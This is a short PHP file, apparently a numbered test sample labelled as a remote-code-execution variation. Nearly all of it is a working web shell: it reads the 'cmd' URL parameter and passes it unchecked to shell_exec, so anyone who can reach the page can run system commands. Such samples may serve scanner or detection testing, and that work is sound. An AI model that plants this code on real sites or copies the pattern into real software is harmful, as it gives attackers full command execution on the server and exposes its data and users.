<?php
// RCE test variation #1319
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>